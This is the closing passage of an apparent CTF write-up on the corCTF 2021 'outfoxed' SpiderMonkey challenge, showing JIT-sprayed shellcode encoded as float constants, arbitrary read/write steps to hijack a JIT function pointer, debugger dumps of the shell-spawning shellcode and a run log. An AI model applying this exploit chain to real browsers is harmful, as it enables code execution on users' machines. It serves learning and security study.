    <span class="nx">sc_marker</span> <span class="o">=</span> <span class="mf">5.40900888</span><span class="nx">e</span><span class="o">-</span><span class="mi">315</span><span class="p">;</span>      <span class="c1">// 0x41414141 in memory - Used as a way to find</span>
    <span class="nx">SC1</span> <span class="o">=</span> <span class="mf">6.828527034422786</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span><span class="p">;</span>
    <span class="nx">SC2</span> <span class="o">=</span> <span class="mf">7.340387646374746</span><span class="nx">e</span><span class="o">+</span><span class="mi">223</span>
    <span class="nx">SC3</span> <span class="o">=</span> <span class="o">-</span><span class="mf">5.6323145813786076</span><span class="nx">e</span><span class="o">+</span><span class="mi">190</span>
    <span class="nx">SC4</span> <span class="o">=</span> <span class="mf">7.748604185565308</span><span class="nx">e</span><span class="o">-</span><span class="mi">304</span>
    <span class="nx">SC5</span> <span class="o">=</span> <span class="mf">7.591064455398236</span><span class="nx">e</span><span class="o">+</span><span class="mi">175</span>
    <span class="nx">SC6</span> <span class="o">=</span> <span class="mf">1.773290436458278</span><span class="nx">e</span><span class="o">-</span><span class="mi">288</span>
    <span class="nx">SC7</span> <span class="o">=</span> <span class="mf">7.748604204935092</span><span class="nx">e</span><span class="o">-</span><span class="mi">304</span>
    <span class="nx">SC8</span> <span class="o">=</span> <span class="mf">2.1152000545026834</span><span class="nx">e</span><span class="o">+</span><span class="mi">156</span>
    <span class="nx">SC9</span> <span class="o">=</span> <span class="mf">2.7173154612872197</span><span class="nx">e</span><span class="o">-</span><span class="mi">71</span>
    <span class="nx">SC10</span> <span class="o">=</span> <span class="mf">1.2811179539027648</span><span class="nx">e</span><span class="o">+</span><span class="mi">145</span>
    <span class="nx">SC11</span> <span class="o">=</span> <span class="mf">4.0947747766066967</span><span class="nx">e</span><span class="o">+</span><span class="mi">40</span>
    <span class="nx">SC12</span> <span class="o">=</span> <span class="mf">1.7766685363804036</span><span class="nx">e</span><span class="o">-</span><span class="mi">302</span>
    <span class="nx">SC13</span> <span class="o">=</span> <span class="mf">3.6509617888350745</span><span class="nx">e</span><span class="o">+</span><span class="mi">206</span>
    <span class="nx">SC14</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.828523606646638</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>  
<span class="p">}</span>

<span class="k">for</span><span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nf">sc</span><span class="p">();</span>
<span class="p">}</span>

<span class="nx">rce_offset</span> <span class="o">=</span> <span class="nx">jitfunc_addr</span> <span class="o">+</span> <span class="mh">0x28</span><span class="nx">n</span><span class="p">;</span>
<span class="nx">jit_addr</span> <span class="o">=</span> <span class="nf">arb_read</span><span class="p">(</span><span class="nx">rce_offset</span><span class="p">);</span>
<span class="nx">code_addr</span> <span class="o">=</span> <span class="nf">arb_read</span><span class="p">(</span><span class="nx">jit_addr</span><span class="p">);</span>

<span class="nx">sc_start</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
<span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">sc_start</span> <span class="o">=</span> <span class="nx">code_addr</span> <span class="o">+</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="nx">i</span><span class="p">);</span>
    <span class="nx">check</span> <span class="o">=</span> <span class="nf">arb_read</span><span class="p">(</span><span class="nx">sc_start</span><span class="p">)</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">check</span> <span class="o">==</span> <span class="mh">0x41414141</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// The start of the real shellcode</span>
<span class="nx">sc_start</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="nx">n</span><span class="p">;</span>
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>pwndbg&gt; search --qword -e 0x41414141
                0x6bb81133a99 add    byte ptr [r8], al /* 'AAAA' */
                0x6bb811345d8 add    byte ptr [r8], al /* 'AAAA' */
pwndbg&gt; x/20gx 0x6bb811345d8
0x6bb811345d8:	0x0000000041414141	0x6e69622fb848686a
0x6bb811345e8:	0xe78948507361622f	0x010101010101b848
0x6bb811345f8:	0x64732eb848500101	0x0431480173646560
0x6bb81134608:	0x0101010101b84824	0x6063b84850010101
0x6bb81134618:	0x314801622c016972	0x5e106a56f6312404
0x6bb81134628:	0x485e156a56e60148	0x01485e186a56e601
0x6bb81134638:	0x6ad231e6894856e6	0x90909090050f583b
0x6bb81134648:	0x00000094361e0b0f	0x0000000000000000
0x6bb81134658:	0x00002759701a0240	0x49d98b4c01084783
0x6bb81134668:	0xfffcfb81412febc1	0x000000f6850f0001
pwndbg&gt; x/20i 0x6bb811345d8+8
   0x6bb811345e0:	push   0x68
   0x6bb811345e2:	movabs rax,0x7361622f6e69622f
   0x6bb811345ec:	push   rax
   0x6bb811345ed:	mov    rdi,rsp
   0x6bb811345f0:	movabs rax,0x101010101010101
   0x6bb811345fa:	push   rax
   0x6bb811345fb:	movabs rax,0x17364656064732e

</pre></table></code></div></div><p>The only thing left is to overwrite the code pointer of a JIT-ed function and call it. I just choose the <code class="language-plaintext highlighter-rouge">sc</code> function itself for simplicity</p><div class="language-js highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nf">arb_write</span><span class="p">(</span><span class="nx">jit_addr</span><span class="p">,</span> <span class="nx">sc_start</span><span class="p">);</span>

<span class="c1">// Trigger real shellcode</span>
<span class="nf">sc</span><span class="p">();</span>
</pre></table></code></div></div><div class="language-zsh highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>➜  cor ./js exp-cleaned.js
<span class="o">[</span>+] leak <span class="o">=</span> 0x000017a847400a80
<span class="o">[</span>+] jitfunc_addr <span class="o">=</span> 0x000017a847400740
<span class="o">[</span>+] jit_addr <span class="o">=</span> 0x000013c905f981a0
<span class="o">[</span>+] code_addr <span class="o">=</span> 0x000012a59c9190d0
found shellcode
<span class="o">[</span>+] sc_start <span class="o">=</span> 0x000012a59c9195a0
bash: /reader: No such file or directory
</pre></table></code></div></div><p>To get the flag on the server, I wrote a solve script where you can find in the full solution below.</p><p><img data-proofer-ignore data-src="/assets/img/outfoxed/flag.png" alt="flag" /></p><h2 id="conclusion">Conclusion</h2><p>This is definitely an awesome learning opportunity for me, stepping out of the v8 comfort zone to learn something new. Because the time was tight, I did not focus on fully understand the details so some are missing, like how objects and values are represented. You can check out the resource reading for more in-depth information. I will definitely learn more thoroughly about Spidermonkey after doing this challenge.</p><p>Full solution can be found <a href="https://github.com/ducphanduyagentp/browser-pwn-advent-calendar/tree/main/06">here</a> <sup id="fnref:4" role="doc-noteref"><a href="#fn:4" class="footnote" rel="footnote">4</a></sup></p><h2 id="footnotes">Footnotes</h2><div class="footnotes" role="doc-endnotes"><ol><li id="fn:1" role="doc-endnote"><p>https://firefox-source-docs.mozilla.org/setup/linux_build.html <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p><li id="fn:2" role="doc-endnote"><p>https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/#jsvalues-and-jsobjects <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p><li id="fn:3" role="doc-endnote"><p>https://webcache.googleusercontent.com/search?q=cache:ySfo3rNPA2kJ:https://labs.f-secure.com/blog/exploiting-cve-2019-17026-a-firefox-jit-bug/ <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p><li id="fn:4" role="doc-endnote"><p>https://github.com/ducphanduyagentp/browser-pwn-advent-calendar/tree/main/06 <a href="#fnref:4" class="reversefootnote" role="doc-backlink">&#8617;</a></p></ol></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/pwn/'>pwn</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a> <a href="/tags/browser/" class="post-tag no-text-decoration" >browser</a> <a href="/tags/spidermonkey/" class="post-tag no-text-decoration" >spidermonkey</a> <a href="/tags/firefox/" class="post-tag no-text-decoration" >firefox</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1"></span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=corCTF 2021 - outfoxed - ret2life&url=https://ret2.life/posts/corCTF-2021/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=corCTF 2021 - outfoxed - ret2life&u=https://ret2.life/posts/corCTF-2021/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=corCTF 2021 - outfoxed - ret2life&url=https://ret2.life/posts/corCTF-2021/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="" title-succeed=""> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Google-CTF-2021/">Google CTF 2021 - Fullchain</a><li><a href="/posts/CSAW-CTF-17-Qual/">CSAW CTF 2017 Qualification</a><li><a href="/posts/AceBear-CTF-19/">AceBear CTF 19</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/browser/">browser</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/radare2/">radare2</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/blue-team/">blue team</a> <a class="post-tag" href="/tags/ccdc/">ccdc</a> <a class="post-tag" href="/tags/chrome/">chrome</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Google-CTF-2021/"><div class="card-body"> <span class="timeago small" >Jul 20, 2021<i class="unloaded">2021-07-20T23:15:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Google CTF 2021 - Fullchain</h3><div class="text-muted small"><p> This year, I played Google CTF under team vh++. Although we did not solve this challenge during the CTF, we have finished it afterwards. This write-up explains the process of studying and writing e...</p></div></div></a></div><div class="card"> <a href="/posts/GRIMM-HAX-Combined-Challenge/"><div class="card-body"> <span class="timeago small" >May 23, 2018<i class="unloaded">2018-05-23T03:08:38+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GRIMM HAX Combined Challenge</h3><div class="text-muted small"><p> This is the write-up for challenges I have done GRIMM HAX challenge. Welcome, Bobby (100pts) Accessing the website at http://www.haxcorp.grimm-co.com/, we are provided with a login page with us...</p></div></div></a></div><div class="card"> <a href="/posts/TetCTF-19/"><div class="card-body"> <span class="timeago small" >Jan 1, 2019<i class="unloaded">2019-01-01T14:34:45+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TetCTF 19</h3><div class="text-muted small"><p> This is my write-up for TetCTF 19 Web - IQTest2 (unsolved) Pwn - Easy webserver (unsolved) Pwn - Babysandbox Pwn - Babyheap Pwn - Babyfirst Web IQTest2 After looking at the s...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Google-CTF-2021/" class="btn btn-outline-primary" prompt="Older"><p>Google CTF 2021 - Fullchain</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Duc Phan</a>.</p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4"></h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/browser/">browser</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/radare2/">radare2</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/blue-team/">blue team</a> <a class="post-tag" href="/tags/ccdc/">ccdc</a> <a class="post-tag" href="/tags/chrome/">chrome</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-WN0BSTHR4X"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-WN0BSTHR4X'); }); </script>
